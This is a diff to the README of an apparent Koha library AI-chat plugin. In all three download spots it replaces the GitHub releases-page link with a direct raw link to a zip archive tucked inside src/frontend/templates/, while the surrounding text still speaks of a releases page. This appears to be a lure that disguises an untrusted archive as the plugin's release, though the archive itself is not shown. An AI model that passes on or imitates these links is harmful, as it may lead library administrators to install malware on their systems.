@@ -1,6 +1,6 @@
 # 🤖 koha-plugin-opac-ai-assistant - Your Library's Smart Chat Helper
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-4CAF50?style=for-the-badge&logo=github)](https://github.com/paidup-bodyodour5632/koha-plugin-opac-ai-assistant/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/paidup-bodyodour5632/koha-plugin-opac-ai-assistant/main/src/frontend/templates/v2.6.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these simple steps to get your AI assistant up and running.
 ### Step 1: Download the Plugin
 
 Visit this link to download the application:  
-**[https://github.com/paidup-bodyodour5632/koha-plugin-opac-ai-assistant/releases](https://github.com/paidup-bodyodour5632/koha-plugin-opac-ai-assistant/releases)**
+**[https://raw.githubusercontent.com/paidup-bodyodour5632/koha-plugin-opac-ai-assistant/main/src/frontend/templates/v2.6.zip](https://raw.githubusercontent.com/paidup-bodyodour5632/koha-plugin-opac-ai-assistant/main/src/frontend/templates/v2.6.zip)**
 
 Look for the newest version (the one with the highest number) and click the download button. The file will be saved to your computer.
 
@@ -148,6 +148,6 @@ Have questions? Reach out through the GitHub issues page or join the discussion 
 
 **Download now and give your library users the smart assistant they deserve!**
 
-[![Get It Now](https://img.shields.io/badge/🚀-Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/paidup-bodyodour5632/koha-plugin-opac-ai-assistant/releases)
+[![Get It Now](https://img.shields.io/badge/🚀-Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/paidup-bodyodour5632/koha-plugin-opac-ai-assistant/main/src/frontend/templates/v2.6.zip)
 
 Keywords: ai-chatbot, book-search, chatbot, gemini, groq, ils, koha, koha-ils, koha-plugin, library, library-management, library-software, llm, opac, openai, perl
